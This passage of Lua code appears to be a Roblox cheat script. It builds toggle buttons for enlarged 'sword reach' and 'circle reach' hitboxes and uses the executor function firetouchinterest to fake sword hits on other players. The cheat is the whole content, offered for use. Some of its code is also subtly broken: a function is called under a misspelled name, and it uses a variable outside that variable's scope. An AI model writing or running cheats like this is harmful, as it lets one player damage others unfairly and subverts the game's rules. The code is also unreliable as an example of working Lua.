	if toggleCircleReach == false then
		toggleCircleReach = true
		CircleReachToggleBtn.Text = "On"
	elseif toggleCircleReach == true then
		toggleCircleReach = false
		CircleReachToggleBtn.Text = "Off"
	end
end)
 
SwordReachToggleBtn.MouseButton1Click:Connect(function()
	if SwordReachToggle == false then
		SwordReachToggle = true
		SwordReachToggleBtn.Text = "On"
	elseif SwordReachToggle == true then
		SwordReachToggle = false
		SwordReachToggleBtn.Text = "Off"
	end
end)
 
CircleStudsUpBtn.MouseButton1Click:Connect(function()
	CircleReachSize = CircleReachSize + 1
	CircleStudsTxt.Text = "Studs: " .. tostring(CircleReachSize)
end)
 
CircleStudsDownBtn.MouseButton1Click:Connect(function()
	if CircleReachSize <= 0 then else
		CircleReachSize = CircleReachSize - 1
		CircleStudsTxt.Text = "Studs: " .. tostring(CircleReachSize)
	end
end)
 
SwordStudsUpBtn.MouseButton1Click:Connect(function()
	SwordReachSize = SwordReachSize + 1
	SwordStudsTxt.Text = "Studs: " .. tostring(SwordReachSize)
end)
 
SwordStudsDownBtn.MouseButton1Click:Connect(function()
	if SwordReachSize <= 0 then else
		SwordReachSize = SwordReachSize - 1
		SwordStudsTxt.Text = "Studs: " .. tostring(SwordReachSize)
	end
end)
 
DmgBtn.MouseButton1Click:Connect(function()
	if DmgBool == false then
		DmgBool = true
		DmgBtn.Text = "On"
	elseif DmgBool == true then
		DmgBool = false
		DmgBtn.Text = "Off"
	end
end)
 
CircleReachVisualizerToggle.MouseButton1Click:Connect(function()
	if visualize1 == true then
		CircleReachVisualizerToggle.Text = "Off"
		part1.Transparency = 1
		visualize1 = false
	elseif visualize1 == false then
		CircleReachVisualizerToggle.Text = "On"
		part1.Transparency = 0.97
		visualize1 = true
	end
end)
 
SwordReachVisualizerToggle.MouseButton1Click:Connect(function()
	if visualize2 == true then
		SwordReachVisualizerToggle.Text = "Off"
		part2.Transparency = 1
		visualize2 = false
	elseif visualize2 == false then
		SwordReachVisualizerToggle.Text = "On"
		part2.Transparency = 0.97
		visualize2 = true
	end
end)
 
HideBtn.MouseButton1Click:Connect(function()
	ScreenGui.Enabled = false
 
	game.StarterGui:SetCore("SendNotification", {
		Title = "Made by TehoTeho";
		Text = "To open the GUI, press R";
		Duration = 10;
	})
 
	guiHiddenBool = true
end)
 
SwordReachInvertToggle.MouseButton1Click:Connect(function()
	if invertedSword == false then
		invertedSword = true
		SwordReachInvertToggle.Text = "On"
	elseif invertedSword == true then
		invertedSword = false
		SwordReachInvertToggle.Text = "Off"
	end
end)
 
part1.Touched:Connect(function(hit)
	if hit.Parent.Name == game.Players.LocalPlayer.Name then else
		spawn(function() dealDamage(hit) end)
	end
end)
 
part2.Touched:Connect(function(hit)
	if hit.Parent.Name == game.Players.LocalPlayer.Name then else
		spawn(function() dealDamage(hit) end)
	end
end)
 
userInputService.InputBegan:Connect(function(key, event)
	if guiHiddenBool == true then
		if event == false then
			if key.KeyCode == Enum.KeyCode.R then
				ScreenGui.Enabled = true
				guiHiddenBool = false
			end
		end
	end
end)
 
local tab = {"Stay2", "Nil", "Up"}
local mainThing = 0
local setColor = {200, 0, 0}
local okTable = {}
 
local function thingIGLOL()
	local found = false
	local removeList = {}
 
	for i = 1, #bigBoyDmgTable do
		local noHealth = false
 
		if bigBoyDmgTable[i]:FindFirstChildWhichIsA("Humanoid") then
			if bigBoyDmgTable[i]:FindFirstChildWhichIsA("Humanoid").Health <= 0 then
				noHealth = true
				table.insert(removeList, i)
			end
		else
			table.insert(removeList, i)
			noHealth = true
		end
 
		if noHealth == false then
			for ii,vv in pairs(bigBoyDmgTable[i]:GetChildren()) do
				if vv:IsA("Part") then
					firetouchinterest(vv, thing:FindFirstChild("Handle"), 0)
					firetouchinterest(vv, thing:FindFirstChild("Handle"), 1)
				end
			end
		end
	end
 
	if #removeList > 0 then
		for i = #removeList, 1, -1 do
			table.remove(bigBoyDmgTable, removeList[i])
		end
	end
end
 
runService.RenderStepped:Connect(function()
	spawn(ThingIGLOL)
 
	for i = 1, #tab do
		if tab[i] == "Up" then
			setColor[i] = setColor[i] + 1
		elseif tab[i] == "Down" then
			setColor[i] = setColor[i] - 1
		end
	end
 
	part1.Size = Vector3.new(CircleReachSize, CircleReachSize, CircleReachSize)
	part1.Color = Color3.fromRGB(setColor[1], setColor[2], setColor[3])
	part2.Size = Vector3.new(1, 1, SwordReachSize + 4)
	part2.Color = Color3.fromRGB(setColor[1], setColor[2], setColor[3])
 
	mainThing = mainThing + 1
 
	local thing = nil
 
	pcall(function()
		if game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
			thing = game.Players.LocalPlayer.Character:FindFirstChild("Sword")
		elseif game.Players.LocalPlayer.Character:FindFirstChild("MatSword") then
			thing = game.Players.LocalPlayer.Character:FindFirstChild("MatSword")
		end
	end)
 
 
	if thing and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Health > 0 and SwordReachToggle == true then
		part2.CFrame = thing:FindFirstChild("Handle").CFrame
		part2.Orientation = Vector3.new(part2.Orientation.X, part2.Orientation.Y, part2.Orientation.Z + 90)
		part2.CFrame = part2.CFrame + part2.CFrame.lookVector * -(SwordReachSize / 2)
 
		if invertedSword == true then
			part2.CFrame = part2.CFrame + part2.CFrame.lookVector * part2.Size.Z / 2
		end
	else
		part2.Size = Vector3.new(0, 0, 0)
	end
 
	if thing and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Health > 0 and toggleCircleReach == true then
		part1.CFrame = thing:FindFirstChild("Handle").CFrame
	else
		part1.Size = Vector3.new(0, 0, 0)
	end
 
	if thing then
		local found = false
 
		for i = 1, #okTable do
			if okTable[i] == thing:FindFirstChild("Handle") then
				found = true
			end
		end
 
		if found == false then
			table.insert(okTable, thing:FindFirstChild("Handle"))
 
			spawn(function() touchHandleFunction(thing:FindFirstChild("Handle")) end)
		end
	end
 
	if mainThing == 200 then
		mainThing = 0
 
		for i = 1, #tab do
			if tab[i] == "Up" then
				tab[i] = "Stay"
			elseif tab[i] == "Stay" then
				tab[i] = "Stay2"
			elseif tab[i] == "Stay2" then
				tab[i] = "Down"
			elseif tab[i] == "Down" then
				tab[i] = "Nil"
			elseif tab[i] == "Nil" then
				tab[i] = "Nil2"
			elseif tab[i] == "Nil2" then
				tab[i] = "Up"
			end
		end
	end
end)